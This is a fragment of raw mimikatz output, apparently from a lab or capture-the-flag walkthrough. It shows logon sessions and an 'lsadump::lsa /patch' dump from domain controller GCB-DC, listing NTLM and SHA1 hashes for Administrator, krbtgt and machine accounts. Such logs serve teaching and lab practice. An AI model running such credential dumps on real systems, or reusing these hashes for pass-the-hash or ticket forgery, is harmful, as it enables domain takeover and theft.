Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:59 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : GCB-DC$
         * Domain   : GCB
         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
        tspkg :
        wdigest :
         * Username : GCB-DC$
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : GCB-DC$
         * Domain   : gcb.local
         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : GCB-DC$
Domain            : GCB
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:59 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : GCB-DC$
         * Domain   : GCB
         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
        tspkg :
        wdigest :
         * Username : GCB-DC$
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : gcb-dc$
         * Domain   : GCB.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 31704 (00000000:00007bd8)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:59 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : GCB-DC$
         * Domain   : GCB
         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
        tspkg :
        wdigest :
         * Username : GCB-DC$
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : GCB-DC$
         * Domain   : gcb.local
         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
        ssp :
        credman :

Authentication Id : 0 ; 750649 (00000000:000b7439)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : GCB
Logon Server      : GCB-DC
Logon Time        : 4/28/2024 11:52:06 PM
SID               : S-1-5-21-2781415573-3701854478-2406986946-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : GCB
         * NTLM     : f1498c1d1a036c796d0093b2eeae02e2
         * SHA1     : 80fd3f4ef0eb32714ebf8afc4a43c22ce63e2bdd
         * DPAPI    : 34c00bb0bf6325e74c778c7c8001455b
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : GCB.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:59 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 31693 (00000000:00007bcd)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:59 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : GCB-DC$
         * Domain   : GCB
         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
        tspkg :
        wdigest :
         * Username : GCB-DC$
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : GCB-DC$
         * Domain   : gcb.local
         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
        ssp :
        credman :

mimikatz(powershell) # lsadump::lsa /patch
Domain : GCB / S-1-5-21-2781415573-3701854478-2406986946

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : f1498c1d1a036c796d0093b2eeae02e2

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 4c478fa3683aad18054ee613b6eed11b

RID  : 00000451 (1105)
User : wsusadmin
LM   :
NTLM : fb0e3e067fd4fccfd0038125b7b46306

RID  : 000003e8 (1000)
User : GCB-DC$
LM   :
NTLM : 62117bcbfd74006c9c5070162d7d177e

RID  : 0000044f (1103)
User : GCB-WSUS$
LM   :
NTLM : e0495ab8e77580009fd7fbb45606170c

RID  : 00000450 (1104)
User : IT$
LM   :
NTLM : 6a017e25b1f6fbd8e607119eaac9ddb3

mimikatz(powershell) # exit
Bye!
```



[back](./section6.html)
